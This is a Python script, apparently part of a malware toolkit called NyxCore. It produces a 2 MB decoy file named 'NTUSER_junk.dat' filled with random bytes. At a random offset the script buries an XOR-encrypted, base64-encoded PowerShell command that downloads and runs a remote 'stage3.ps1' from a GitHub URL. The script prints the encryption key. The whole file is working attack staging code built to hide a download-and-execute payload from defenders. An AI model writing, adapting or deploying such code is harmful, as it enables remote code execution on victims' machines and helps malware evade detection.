import os
import base64
import random

ENCRYPTION_KEY = b"NyXc0r_4dv4nc3d_M4lw4r3_2025_"

def encrypt_data(data):
    """XOR encryption with key bytes"""
    key_bytes = ENCRYPTION_KEY * (len(data) // len(ENCRYPTION_KEY) + 1)
    key_bytes = key_bytes[:len(data)]
    encrypted = bytes(a ^ b for a, b in zip(data, key_bytes))
    return base64.b64encode(encrypted).decode()

def generate_junk_with_encrypted_payload(size_mb=2):
    """Generate junk data with encrypted PowerShell payload"""
    target_size = size_mb * 1024 * 1024
    junk_data = bytearray()
    
    # PowerShell payload to download and execute stage3.ps1 (You Can Make Your Own Payload)
    ps_payload = "IEX((New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/h41th3m0x/NyxCore/refs/heads/main/PowerShellScripts/stage3.ps1'))"
    
    # Encrypt the payload
    encrypted_payload = encrypt_data(ps_payload.encode())
    print(f"Encrypted payload size: {len(encrypted_payload)} bytes")
    
    # Insert encrypted payload at random position
    insert_position = random.randint(target_size // 4, target_size // 2)
    
    # Fill with junk before insertion
    while len(junk_data) < insert_position:
        junk_data.extend(os.urandom(random.randint(500, 2000)))
    
    # Insert encrypted payload
    junk_data.extend(encrypted_payload.encode())
    
    # Fill remaining space with junk
    while len(junk_data) < target_size:
        junk_data.extend(os.urandom(random.randint(500, 2000)))
    
    return bytes(junk_data[:target_size])

def main():
    output_dir = "../Data/"
    os.makedirs(output_dir, exist_ok=True)

    output_file = os.path.join(output_dir, "NTUSER_junk.dat")
    junk_data = generate_junk_with_encrypted_payload(2)
    
    with open(output_file, 'wb') as f:
        f.write(junk_data)
    
    file_size = os.path.getsize(output_file) / (1024 * 1024)
    print(f"Generated {file_size:.2f}MB junk file: {output_file}")
    print(f"Encryption Key (bytes): {ENCRYPTION_KEY}")

if __name__ == "__main__":
    main()
